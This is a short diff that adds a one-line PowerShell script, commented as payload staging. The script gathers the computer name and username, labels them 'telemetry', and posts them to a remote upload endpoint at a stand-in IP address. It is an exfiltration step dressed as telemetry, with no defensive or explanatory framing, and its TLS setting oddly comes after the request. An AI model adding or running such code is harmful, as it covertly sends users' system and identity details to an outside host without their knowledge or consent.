@@ -1,0 +1,1 @@
+<# Payload staging #> $PayloadJson = [ordered]@{ Host = $env:COMPUTERNAME; User = $env:USERNAME; Stage = "telemetry" } | ConvertTo-Json; Invoke-RestMethod -Uri "https://192.0.2.62/upload" -Method Post -Body $PayloadJson -ContentType "application/json"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Write-Verbose "stage marker 21 reached"
